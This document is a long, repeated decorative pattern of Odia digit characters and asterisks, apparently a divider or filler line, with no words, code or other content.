୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* 